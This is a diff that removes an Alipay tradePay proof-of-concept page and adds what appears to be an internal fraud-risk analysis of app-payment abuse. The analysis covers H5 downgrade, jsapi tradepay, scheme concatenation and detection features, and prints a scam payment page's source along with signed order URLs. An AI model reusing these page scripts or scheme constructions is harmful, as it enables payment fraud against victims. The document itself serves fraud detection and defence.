@@ -1,49 +1,510 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>支付宝支付</title>
-    <script>
-        window.alert = function (name) {
-           var iframe = document.createElement("IFRAME")
-           iframe.style.display = "none"
-           iframe.setAttribute("src", 'data:text/plain')
-           document.documentElement.appendChild(iframe)
-           window.frames[0].window.alert(name)
-           iframe.parentNode.removeChild(iframe)
-        }
-        // 判断是否为支付宝
-        function isAlipayClient() {
-            var userAgent = navigator.userAgent.toLowerCase();
-            return /alipayclient|alipay/.test(userAgent);
-        }
-        function ready(callback) {
-          // 如果jsbridge已经注入则直接调用
-          if (window.AlipayJSBridge) {
-            callback && callback();
-          } else {
-            // 如果没有注入则监听注入的事件
-            document.addEventListener('AlipayJSBridgeReady', callback, false);
-          }
-        }
-        window.onload = function() {
-            var ua = navigator.userAgent.toLowerCase();
-            if(!isAlipayClient()){
-                alert('请用支付宝扫码');
-                return
-            }
-            
-            ready(function() {
-                // 执行页面跳转
-                AlipayJSBridge.call("tradePay", {
-                  orderStr: "alipay_sdk=alipay-sdk-java-4.35.166.ALL&app_id=2019041863943406&biz_content=%7B%22body%22%3A%22%E8%99%9A%E6%8B%9F%E5%8D%A1%E5%BC%80%E5%8D%A1%22%2C%22business_params%22%3A%22%7B%5C%22mcCreateTradeIp%5C%22%3A%5C%22114.215.250.82%5C%22%2C%5C%22outTradeRiskInfo%5C%22%3A%5C%22%7B%5C%5C%5C%22desensitizedUid%5C%5C%5C%22%3A%5C%5C%5C%220033149769%5C%5C%5C%22%2C%5C%5C%5C%22extraAccountPhoneLastTwo%5C%5C%5C%22%3A%5C%5C%5C%2226%5C%5C%5C%22%2C%5C%5C%5C%22mcCreateTradePackage%5C%5C%5C%22%3A%5C%5C%5C%22com.jiuyu.sptcc.phonegap%5C%5C%5C%22%2C%5C%5C%5C%22mcCreateTradeTime%5C%5C%5C%22%3A%5C%5C%5C%222025-01-20+17%3A06%3A15%5C%5C%5C%22%2C%5C%5C%5C%22sysVersion%5C%5C%5C%22%3A%5C%5C%5C%2218.1.1%5C%5C%5C%22%7D%5C%22%7D%22%2C%22out_trade_no%22%3A%22202501201706151101B5%22%2C%22passback_params%22%3A%220001%22%2C%22product_code%22%3A%22QUICK_MSECURITY_PAY%22%2C%22subject%22%3A%22%E8%99%9A%E6%8B%9F%E5%8D%A1%E5%BC%80%E5%8D%A1%22%2C%22time_expire%22%3A%222025-01-20+17%3A11%3A15%22%2C%22total_amount%22%3A%2220.0%22%7D&charset=utf-8&format=json&method=alipay.trade.app.pay&notify_url=https%3A%2F%2Fonline.sptcc.com%3A8443%2Fhandapp_alipay%2FbackRcvResponse&sign=FCQbjZZYnXYrSPWv7cjPeyUIxhr7xri%2BBlz%2FdjJBzAD8yzkGnDO9QBZDj7%2BvoZym%2FW4EFE02px1iPhUHDS29LUbWhiwtwryv9OiScfilzrVV4h2E23XxDhdvXouOKNfZgYABBCIl7NOPgWUlx4Zd2fRoK3N2%2BhzWeFoQLVFH8hea7o1vEFW9PRFCjWEzcuiRaNwBu3f1wGLChKq54O1kjDIz5Cmq2ofbxhW7vNN8GLKyMBFAV5cvIRqXGS%2F1O%2FmMvgsYR%2FX%2FhP06Rb8koeo0J7%2Bi6gTb17fEEY%2BQRf1J7g9WqXEQSSRsRGl0r0m17YY5PcxUx833PLW%2B3wpkJMyicQ%3D%3D&sign_type=RSA2&timestamp=2025-01-20+17%3A06%3A15&version=1.0"
-                }, function(result) {
-                  alert(JSON.stringify(result));
-                });
-            })
-        };
-    </script>
-</head>
 <body>
+1 APP支付产品介绍
+APP支付是指商家在商家移动端 App 中集成支付宝 SDK，调起支付宝来完成付款的一种支付产品。适用于在商家移动端 App 内使用支付宝支付功能的场景..https://opendocs.alipay.com/open/00dn73?pathHash=b91b9616
+
+● 第 1 步用户在商户 App 客户端/小程序中购买商品下单。
+● 第 2 步商户订单信息由商户 App 客户端/小程序发送到服务端。
+● 第 3 步商家服务端调用 alipay.trade.app.pay（app支付接口2.0接口）通过支付宝服务端 SDK 获取 orderStr（orderStr 中包含了订单信息和签名）。
+● 第 4 步商家将 orderStr 发送给商户 App 客户端/小程序。
+● 第 5 步商家在客户端/小程序发起请求，将 orderStr 发送给支付宝。
+● 第 6 步进行支付预下单：支付宝客户端将会按照商家客户端提供的请求参数进行支付预下单。正常场景下，会唤起支付宝收银台等待用户核身；异常场景下，会返回异常信息。
+---》
+从交互上看，app.pay这个接口返回orderStr,orderStr再发到支付宝交互就可以拉起收银台进行支付。
+● 如果集成SDK，则调用alipaysdk拉起收银台；
+● 如果未集成，商户可以拼接scheme唤起;
+● 如果未安装支付宝，则降级请求mcpay返回mclient.alipay.com h5支付链接。
+
+2 APP支付利用路径
+除了深度诈骗引导到官方app自主下单的受害者外，APP支付最主要的利用点也是【A创B付】。
+● 历史对app支付产品升级，apptoken校验。但需要商户升级sdk、用户升级版本、适ios等客观原因，无法完全覆盖防控。
+● 商户联防，需要商户传入创单ip等防控参数；商户范围有限，主要是SKA
+
+● 根据历史case分析，目前看到的app支付的利用路径。
+（1）APP支付降级h5，截获h5支付链接
+未安装支付宝自动降级，或者通过工具降级 && h5支付链接可以随意转发
+利用路径：
+
+
+历史case举例：
+
+可建特征：
+● 攻击者维度
+  ○ 批量降级请求的批量&聚集性风险
+    ■ 离线时效性不足；
+    ■ 在线防控需要跟海关沟通累计特征的策略防控能力
+● 受害者维度：
+  ○ 支付降级订单 && 用户已安装支付宝的gap--》这个海关能采集到么
+  ○ ip变化
+
+（2）APP支付orderStr/tradeno，通过jsapi tradepay拉起收银台
+利用路径：
+
+https://github.com/ysfdf/ysfdf.github.io/blob/d4bfd3e613a230fc4ef1b698b3d9b21b65e20e13/zfborder.html
+
+手法已验证@文栖
+
+历史case举例：
+
+
+
+可建特征：
+● APP支付收银台唤起方式为 jsapi 
+● jsapi执行必然在端内，所以可以叠加低质域名；
+● ip变化，如果商户传了的话--》sdk请求的话，spanner/海关应该是没流量的
+● 可观察：orderStr如果携带alipay-sdk，代表是从sdk获取的，再进端内tradepay，这个就比较奇怪。--》海关是否可识别，交易订单是否通过sdk创建？
+
+（3）APP支付orderStr,scheme拼接拉起收银台
+利用路径
+未集成sdk，商户是可以自行拼接的，这种安全性就更低
+
+
+详细利用方式
+appId=20000125&orderSuffix= + app支付参数
+case举例
+20250120-快手app-拼接scheme
+详细分析
+http://pppp.trnp.cn:66 代码里是怎么实现拼接的
+原网页已经失效，无法判定是否拼接，不过可以根据扫码链接同时包含20000125 & orderSuffix清洗下
+以快手为例，既然是app提交参数，可以自行尝试进行拼接：
+alipays://platformapi/startApp?appId=20000125&orderSuffix=app_id%3D2021001133681143%26biz_content%3D%257B%2522subject%2522%253A%2522%25E5%25B0%258F%25E5%25BA%2597%25E8%25AE%25A2%25E5%258D%2595%25E6%2594%25AF%25E4%25BB%2598%2522%252C%2522out_trade_no%2522%253A%2522CPOiup7115687994766341620000731%2522%252C%2522total_amount%2522%253A%252250.00%2522%252C%2522product_code%2522%253A%2522QUICK_MSECURITY_PAY%2522%252C%2522time_expire%2522%253A%25222025-01-24%2B14%253A02%253A42%2522%252C%2522disable_pay_channels%2522%253A%2522pcreditpayInstallment%2522%252C%2522passback_params%2522%253A%2522GM712131691323525399%2523CPN711556322890220502%25232088731518061305%25231140127098%2522%252C%2522settle_info%2522%253A%257B%2522settle_detail_infos%2522%253A%255B%257B%2522amount%2522%253A%252250.00%2522%252C%2522trans_in_type%2522%253A%2522defaultSettle%2522%257D%255D%257D%252C%2522sub_merchant%2522%253A%257B%2522merchant_id%2522%253A%25222088260143315292%2522%257D%252C%2522extend_params%2522%253A%257B%2522categoryId%2522%253A%2522credit_payment_00009%2522%252C%2522serviceId%2522%253A%25222021121000000000000086433000%2522%252C%2522outAgreementNo%2522%253A%2522CPOiup7115687994766341620000731%2522%252C%2522creditPaySignScene%2522%253A%2522ALIPAY_RECOMMEND_SIGN%2522%257D%252C%2522business_params%2522%253A%257B%2522settleMode%2522%253A%2522CAPTURE%2522%252C%2522outTradeRiskInfo%2522%253A%2522%257B%255C%2522netWork%255C%2522%253A%255C%2522%2525E4%2525B8%2525AD%2525E5%25259B%2525BD%2525E7%252594%2525B5%2525E4%2525BF%2525A1_5%255C%2522%252C%255C%2522mobileOperatingPlatform%255C%2522%253A%255C%2522ios%255C%2522%252C%255C%2522sysVersion%255C%2522%253A%255C%252218.11%255C%2522%252C%255C%2522mcCreateTradeTime%255C%2522%253A%255C%25222025-01-24%2B13%253A47%253A43%255C%2522%252C%255C%2522desensitizedUid%255C%2522%253A%255C%2522cf2cf209946aabf8f9b21a760dfd853e71fbb653131ce3522c1f35c898012ab8%255C%2522%257D%2522%252C%2522mcCreateTradeIp%2522%253A%25222401%253Ab180%253A1000%253A8001%253A1c21%253A6b78%253A1c21%253A6b78%2522%257D%257D%26charset%3Dutf-8%26method%3Dalipay.trade.app.pay%26notify_url%3Dhttps%253A%252F%252Fwww.kuaishoupay.com%252Fpay%252Fchannel%252Fnotify%252Falipay%252Fin_app%26sign%3DKt%252FK%252B5ycM87xXcgVHAvbNlCo9GDSwO%252FNL4vWoDmrtbLi6d1XFfFZI0cP%252BKMhGp0MRENqfh9%252FUYX6Nn9kSfGHKC1CmBrCGvNUiWhoGnaSBBKC%252F82c7WlOAkpO5sA3dmoz26bCtNOAp%252FnUd1UsvOn6nn1fNwDJXei7Elq41KzZBMzS3RV2Wwy4vf71d%252Fuw7TUAResZ39IbRiT5sUqINvna6BDDo0TEWrIfOc6HgUieN55Q%252FV3obhAPKOVJyM%252F52x3kVEjSFg37vX99e9NgGyhwqKZSMflIYjayHPTzKikU9P3LlXSg5oh5phYd3ExEkOI41BXanD6Rwk5LZTxoAj9zuQ%253D%253D%26sign_type%3DRSA2%26timestamp%3D2025-01-24%2B13%253A47%253A59%26version%3D1.0
+
+
+拼接66666858/20000125&mqpSchemePay
+case举例
+www.su7888.xyz=>支付html源码=>待分析下
+﻿
+
+<!DOCTYPE html>
+
+<html>
+
+<head>
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta name="viewport"
+
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+
+    <title>
+
+        支付宝
+
+    </title>
+
+    <link href="/css/pay.css" rel="stylesheet">
+
+    <script type="text/javascript" src="/js/jquery.3.2.1.min.js"></script>
+
+</head>
+
+
+
+<body style="">
+
+<div class="body">
+
+    <h1 class="mod-title">
+
+        <span class="ico_log ico-1"></span>
+
+    </h1>
+
+
+
+    <div class="mod-ct" style="height:600px;">
+
+        <div>
+
+            <input type="hidden" id="hfod" name="hidorderno" value="1697360856">
+
+        </div>
+
+        <div class="amount" id="money">￥ 100</div>
+
+
+
+        <div id="erweima">
+
+            <div class="paytxt" style="color:red;font-size:1.4em;">1.截图二维码</div>
+
+            <div class="paytxt" style="color:red;font-size:1.4em;">2.手动打开支付宝扫码付款！</div>
+
+            
+
+            <div class="paybtn" style="">
+
+                <div id="alipayform" style="text-align:center;padding:20px 10px"></div>
+
+            </div>
+
+
+
+            <div class="time-item" style="padding-top: 145px">
+
+
+
+                <strong id="hour_show"><s id="h"></s>0时</strong>
+
+                <strong id="minute_show"><s></s>00分</strong>
+
+                <strong id="second_show"><s></s>00秒</strong>
+
+            </div>
+
+            
+
+        </div>
+
+
+
+        <a id="pay_btn" href="">
+
+            <button type="button"
+
+                    style="border-radius: 5px;background-color:royalblue;color:#FFFFFF;font-size:22px; height:45px;width:340px;bolder:0;">
+
+                点击打开支付宝APP付款
+
+            </button>
+
+        </a>
+
+    </div>
+
+
+
+</div>
+
+<script src="/js/jquery.qrcode.min.js"></script>
+
+<script src="/js/base64.js"></script>
+
+<script>
+
+    function getDeviceType() {
+
+        if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)) {  //判断iPhone|iPad|iPod|iOS
+
+            sid = 'ios';
+
+        } else if (/(Android)/i.test(navigator.userAgent)) {   //判断Android
+
+            sid = 'andorid';
+
+        } else {  //pc
+
+            sid = 'pc';
+
+        }
+
+        return sid;
+
+    }
+
+
+
+    function getRandom(minValue, maxValue) {
+
+        return parseInt(Math.random() * (maxValue - minValue + 1) + minValue);
+
+    }
+
+
+
+    function randomString(e) {
+
+        e = e || 32;
+
+        var t = "ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz",
+
+            a = t.length,
+
+            n = "";
+
+        for (i = 0; i < e; i++) n += t.charAt(Math.floor(Math.random() * a));
+
+        return n
+
+    }
+
+
+
+    var deviceType = getDeviceType();
+
+
+
+    function alipayBuild(payOrderStr) {
+
+        var packName = 'com.pupumall.customer';
+
+        var av = "h.a.3.6.8";
+
+        var sv = "h.a.3.6.8";
+
+        var appkey = "2088511785357644";
+
+        var alipaysUrl = '';
+
+        if (deviceType === "ios") {
+
+            var jso nObj = {
+
+                'requestType': "SafePay",
+
+                'fromAppUrlScheme': "alipays" //alisdkdemo
+
+            };
+
+            jsonObj.dataString = payOrderStr + '&bizcontext={"appkey":"' + appkey + '","ty":"ios_lite","sv":"' + sv + '","an":"' + packName + '","av":"' + av + '","sdk_start_time":' + Date.now() + '}';
+
+            alipaysUrl = 'alipay://alipayclient/?' + encodeURIComponent(JSON.stringify(jsonObj));
+
+            $("#pay_btn").css("display", "none");
+
+            // $(".paybtn").css("display", "none");
+
+            // $(".paytxt").css("display", "none");
+
+            // $(".time-item").css("padding-top", "45px");
+
+        } else {
+
+            var tempSD = payOrderStr + '&bizcontext={"appkey":"' + appkey + '","ty":"ios_lite","sv":"' + sv + '","an":"' + packName + '","av":"' + av + '","sdk_start_time":' + Date.now() + '}';
+
+            var dt = {
+
+                "sourcePid": getRandom(1000, 9999),
+
+                "pkgName": "com." + randomString(4) + "." + randomString(5),
+
+                "session": randomString(10),
+
+                "external_info": tempSD
+
+            };
+
+            alipaysUrl = 'alipays://platformapi/startapp?appId=20000125&mqpSchemePay=' + Base64.encode(JSON.stringify(dt));
+
+            $("#pay_btn").css("display", "none");
+
+        }
+
+        return alipaysUrl;
+
+    }
+
+</script>
+
+
+
+<script>
+
+    var jumpurl = window.location.href;
+
+
+
+    jumpurl = "alipays://platformapi/startapp?appId=66666858&url=" + jumpurl;
+
+
+
+    var ua = navigator.userAgent.toLowerCase();
+
+
+
+    // if (ua.match(/AlipayClient/i) == 'alipayclient') {
+
+        var pay_url = 'alipay_sdk=alipay-sdk-java-4.39.2.ALL&app_id=2016071401616982&biz_content=%7B%22body%22%3A%22%7B%5C%22pay_type%5C%22%3A10%7D%22%2C%22out_trade_no%22%3A%22GF8041971737706520001PAY01%22%2C%22passback_params%22%3A%22%257B%2522pay_type%2522%253A10%252C%2522channel_type%2522%253A10%257D%22%2C%22seller_id%22%3A%22pay%40pupumall.com%22%2C%22subject%22%3A%22%E6%9C%B4%E6%9C%B4%E7%94%B5%E5%AD%90%E5%8D%A1%E8%AE%A2%E5%8D%95%22%2C%22time_expire%22%3A%222025-01-24+16%3A26%22%2C%22total_amount%22%3A%22100.00%22%7D&charset=UTF-8&format=json&method=alipay.trade.app.pay&notify_url=https%3A%2F%2Fpaynotify-aws.pupuapi.com%2Fclient%2Fpayment%2Fpay%2Fnotify%2FpayTypes%2F10%2FchannelTypes%2F10%2FGF8041971737706520001PAY01&sign=uSAW6nF%2BQvZAIuXOIWcxOcGULgSD722NhHmDmRqZ7ntxAeMGyQJjZWnIBm7rybsqJF4dGlQ50x9v5Vj9Ea1L11uMuWWSUNDaDC0LnTpk8JRk8ibnIzSAUDx%2BIn6WU0nngBUhgYue6z55LsXqnIGxKklP8wez%2BwX3oJ8E7283EOM%3D&sign_type=RSA&timestamp=2025-01-24+16%3A15%3A20&version=1.0';
+
+
+
+        var alipaysUrl = alipayBuild(pay_url);
+
+
+
+        //var alipaysUrl = "alipays://platformapi/startApp?appId=20000125&orderSuffix=" + encodeURIComponent(pay_url);
+
+        alipaysUrl = "alipays://platformapi/startapp?appId=66666858&url=" + encodeURIComponent(alipaysUrl);
+
+        $("#pay_btn").attr('href', alipaysUrl);
+
+    // } else {
+
+    //     $("#pay_btn").attr('href', jumpurl);
+
+    // }
+
+    if (ua.match(/AlipayClient/i) == 'alipayclient') {
+
+        $("#pay_btn").css("display", "block");
+
+        $(".paybtn").css("display", "none");
+
+        $(".paytxt").css("display", "none");
+
+        $(".time-item").css("padding-top", "45px");
+
+    }
+
+    
+
+    $('#alipayform').qrcode({
+
+        text: window.location.href,
+
+        width: 200,
+
+        height: 200
+
+    });
+
+    
+
+    timer('77');
+
+
+
+    function timer(intDiff) {
+
+        myTimer = window.setInterval(function () {
+
+            var day = 0,
+
+                hour = 0,
+
+                minute = 0,
+
+                second = 0;//时间默认值
+
+            if (intDiff > 0) {
+
+                day = Math.floor(intDiff / (60 * 60 * 24));
+
+                hour = Math.floor(intDiff / (60 * 60)) - (day * 24);
+
+                minute = Math.floor(intDiff / 60) - (day * 24 * 60) - (hour * 60);
+
+                second = Math.floor(intDiff) - (day * 24 * 60 * 60) - (hour * 60 * 60) - (minute * 60);
+
+            }
+
+            if (minute <= 9) minute = '0' + minute;
+
+            if (second <= 9) second = '0' + second;
+
+            $('#hour_show').html('<s id="h"></s>' + hour + '时');
+
+            $('#minute_show').html('<s></s>' + minute + '分');
+
+            $('#second_show').html('<s></s>' + second + '秒');
+
+            if (hour <= 0 && minute <= 0 && second <= 0) {
+
+                clearInterval(myTimer);
+
+            }
+
+            intDiff--;
+
+        }, 1000);
+
+    }
+
+
+
+    function query() {
+
+        return new Promise((resolve, reject) => {
+
+            $.post('query', {
+
+                merchant_id: '105',
+
+                order_no: 'WY202501241614595628597',
+
+                amount: '100',
+
+                sign: 'F88E3BD80BBDB3CE5DE5EC393ECFD0D9'
+
+            }, function (data) {
+
+                if (data.data.status !== 0) {
+
+                    location.reload();
+
+                }
+
+                resolve()
+
+            })
+
+        })
+
+    }
+
+
+
+    var queryInt = setInterval(query, 8000);
+
+</script>
+
+</body>
+
+</html>
+详细分析
+
+根据html源码分析，支付宝扫码付款时会根据当前设备的不同，形成不同跳转链接；而支付链接在一开始生成orderId的时候就形成了。后续通过ios/安卓形成不同跳转方式
+--》66666858（零花钱）
+--〉mqpSchemePay是之前标准版sdk的h5唤起方式，虽然，但现在依然存在
+alipays://platformapi/startapp?appId=66666858&url=alipay://alipayclient/?
+alipays://platformapi/startapp?appId=20000125&mqpSchemePay=
+详细如下流程图
+
+
+可建特征：
+● app支付收银台唤起方式scheme； 需要叠加 交易商户是否集成sdk的判断
+
+
+3 产品风险监控-- todo
+20250123 1日底线风险数据粗粗分析，降级/tradepay/scheme不完全分析 涉案投诉中交易占比30%，金额占比20%；其中：
+● 欺诈:电信欺诈 金额占比10%，其他欺诈80%
+● 赌色：大概16%	
+
+
+  ○ 
+附件
+（1）app支付流量样例
+筛选扫码接口中包含可能H5及app支付参数的请求历史流量
+CREATE TABLE tmp_wenqi_ana_0124_05 AS
+(
+    SELECT  *
+    FROM    afscdm.dwd_sec_evt_http2_record_mobilev2_hi
+    WHERE   dt = '20250123'
+    AND     http_operation_type = "alipay.mobilecodec.route"
+    AND     hour IN ("00","01","02","03")
+    AND     (
+                format_request_body RLIKE "h5_route_token"
+                OR      format_request_body RLIKE "alipay.trade.app.pay"
+                OR      format_response_body RLIKE "h5_route_token"
+                OR      format_response_body RLIKE "alipay.trade.app.pay"
+    )
+)
+（2）app支付拼接分析
+appId=20000125&orderSuffix= + app支付参数
+清洗了23日00:00-04:00的流量，主要存在两种拼接方式，分别对应app提交参数以及H5链接参数
+● h5routetoken为h5支付拼接方式
+● method=alipay.trade.app.pay 的为该接口的返回的orderstr字符串
+
+当然app提交参数可以包含其他method，比如：alipay.fund.auth.order.app.freeze（预授权），举例如
+alipays://platformapi/startApp?appId=20000125&orderSuffix=alipay_root_cert_sn=687b59193f3f462dd5336e5abf83c5d8_02941eef3187dddf3d3b83462e1dfcf6&alipay_sdk=alipay-sdk-java-4.40.13.ALL&app_cert_sn=92506cdccd0ab8122d3bacceabc9ec3e&app_id=2021005109673229&biz_content={"amount":"99.99","deposit_product_mode":"DEPOSIT_ONLY","order_title":"共享租赁","out_order_no":"867954263798579200","out_request_no":"867954263798579200","payee_user_id":"2088942492031321","product_code":"PREAUTH_PAY","timeout_express":"3m"}&charset=UTF-8&format=json&method=alipay.fund.auth.order.app.freeze&sign=c/Kz4U2LrIL1vhbIkAfJBCoaqi/cJpQi6ixx/zrSUlxcebR7ZY+HwB8FcEgTED+k94HQrUxAvGg9+cyhkQNawZ2cvT3BoFzAzOtSEH/7Q/rxErbwBmOV833ON+Uke1JaGgwg1LiYSDGt29VT1DvuldQa1Ol7Xd0BmelQ57mxW+mM+oG9z1to0AjrSkH8Dh/EV92vmpiSMYGKhtMoec8uZfVIX+W0RbnLsmiomKhwGwdQVs+VACdKMLaK8Q4T5lv8gcjF4P2u/GtTZTANdUN+U9p/GS0KiZl6pZYdOMQZ9folCiT8EBsnkkjFF6zG/V+h1HHX67X2lNfMoEPnnGEYpQ==&sign_type=RSA2&timestamp=2025-01-22+19:09:49&version=1.0&enableKeepAlive=NO&appInfoInBg=YES
+支付2088：2088042039488440 商户2088：2088942492031321(恶意，赌博/欺诈 相关）
+拼接60000157拉起签约支付---放在商户代扣产品里看
+case举例
+alipays://platformapi/startApp?appId=60000157&orderStr=app_id%3D2018010301536905%26method%3Dalipay.trade.app.pay%26charset%3Dutf-8%26sign_type%3DRSA2%26sign%3DRIJ9Hikgpfee4QhDCypQdPK%252F6nDRZZCkfu2FU7iNnsiVJv07lAMbx9BziXamNU%252BqZNBx%252BPT%252BtCqCer7DenAaoP5mTWhuhKX47MYoAbimuJUmCM0yvIOzxgnVsZpiAA1j1cdO44arKZivcT6HjB%252FWGhPCQluU8x9%252FwrllLUxI7mkNxc8a%252BAFXw9clk8p1StaZMFgz4NHWV5EyfPASXM9o1dAmwLJmN1RArqnlzizVKMbQc6aSpZZW2MUKPTKVmtoNpz1PDcpGQ4YW9serVfW7kZ5F3vQ7n3u%252BMRfxWm%252ByFP8L22VZ8VH3P01j1edn2Ha35e058m1yaaJtmTQ5Q8xeeg%253D%253D%26time_expire%3D2025%252D01%252D23%2B01%253A22%253A55%26timestamp%3D2025%252D01%252D23%2B01%253A17%253A55%26version%3D1.0%26notify_url%3Dhttp%253A%252F%252Fpay%252Ejjmatch%252Ecn%252Fsyncback%252Fauto%255Frenew%252Fmayijinfu%255Fpay%255Fsync%252Ephp%26biz_content%3D%257B%2522agreement%255Fsign%255Fparams%2522%253A%257B%2522access%255Fparams%2522%253A%257B%2522channel%2522%253A%2522ALIPAYAPP%2522%257D%252C%2522external%255Fagreement%255Fno%2522%253A%2522CW202501230117550148486578000144%2522%252C%2522personal%255Fproduct%255Fcode%2522%253A%2522GENERAL%255FWITHHOLDING%255FP%2522%252C%2522sign%255Fnotify%255Furl%2522%253A%2522https%253A%252F%252Fpay%252Ejjmatch%252Ecn%252Fsyncback%252Fauto%255Frenew%252Fali%255Fsign%255Fwithhold%255Fsync%252Ephp%2522%252C%2522sign%255Fscene%2522%253A%2522INDUSTRY%257CGAME%255FCHARGE%2522%257D%252C%2522out%255Ftrade%255Fno%2522%253A%2522202501230117550010584201%2522%252C%2522product%255Fcode%2522%253A%2522GENERAL%255FWITHHOLDING%2522%252C%2522subject%2522%253A%2522JJ%25E6%25AF%2594%25E8%25B5%259B%25E6%2594%25AF%25E4%25BB%2598%25E5%25AE%259D%25E5%2585%2585%25E5%2580%25BC%2522%252C%2522total%255Famount%2522%253A30%252E0%257D%250A
+详细分析
+该方式通过容器60000157拉起app支付链接，虽然60000157为支付签约中心，但该容器仅限可以拉起任意支付链接。
 </body>
 </html>
